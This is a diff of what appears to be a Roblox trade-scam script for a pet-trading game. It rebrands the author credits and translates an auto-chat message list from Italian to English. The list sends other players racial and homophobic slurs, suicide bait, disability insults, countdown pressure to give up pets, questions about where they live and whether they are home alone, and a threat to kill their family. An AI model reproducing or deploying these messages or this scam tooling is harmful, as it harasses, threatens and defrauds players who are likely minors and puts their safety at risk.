@@ -346,7 +346,7 @@ local fetchProfile = RouterClient.get("PlayerProfileAPI/FetchProfile")
 -- ==================== END PET VALUE SYSTEM ====================
 
 local CONFIG = {
-   PARTNER_NAME = 'RobyPolarBearYT',
+   PARTNER_NAME = 'Zeta',
    PARTNER_USER_ID = 987654321,
    AUTO_ACCEPT_DELAY = 0.2,
    AUTO_CONFIRM_DELAY = 0.3,
@@ -364,10 +364,10 @@ local CONFIG = {
    SPAWN_FAKE_PLAYER_WITH_RANDOM_PET = false,
    FAKE_PLAYER_ACCEPT_TRADE_REQUEST = 2,
    CHAT_MESSAGES = {
-       'Ucciditi?', 'Obeso fai schifo regalami i tuoi pet', 'Aggiungi coglione??', 'Negro di merda', 'frocio succhiami il cazzo', 'Tutti a mettere il follow?',
-       'Respinna ti prego?', 'balena', 'aggiungi o ti declino lo scambio coglione', 'abiti a Venezia vero?', 'è finita per te',
-       'Can i get mega pet', 'Disabile', 'Hai 10 secondi per darmi i pet', '5 secondi da adesso',
-       'sei da solo a casa?', 'frocetto sto arrivando a casa tua, ora uccido tutti i tuoi parenti',
+      'Kill yourself?', 'Obese, you suck, give me your pets', 'Add, asshole?', 'Fucking nigger', 'Faggot, suck my dick', 'Everyone follow me?',
+      'Respin, please?', 'Whale', 'Add me or I decline the trade, asshole', 'You live in Venice, right?', 'It's over for you',
+      'Can I get mega pet', 'Disabled', 'You have 10 seconds to give me the pets', '5 seconds from now',
+      'Are you home alone?', 'Faggot, I'm coming to your house, now I'm killing all your parents',
    },
    AUTO_CHAT_DELAY = 2,
    VERIFIED_FRIENDS = {
@@ -1826,7 +1826,7 @@ local titleLabel = Instance.new('TextLabel')
 titleLabel.Size = UDim2.new(1, 0, 0, 22)
 titleLabel.Position = UDim2.new(0, 0, 0, 2)
 titleLabel.BackgroundTransparency = 1
-titleLabel.Text = 'dormid4isy On Discord'
+titleLabel.Text = 'ZetaScripts (last4zeta on tt)'
 titleLabel.Font = Enum.Font.FredokaOne
 titleLabel.TextSize = 12
 titleLabel.TextColor3 = Color3.fromRGB(240, 240, 255)
@@ -4348,4 +4348,4 @@ task.spawn(function()
    end
 end)
 
-print("m0_3a on discord made this script, for any other inquires please message me on discord.")
+print("hamsterz8 on discord made this script, for any other inquires please message me on discord.")
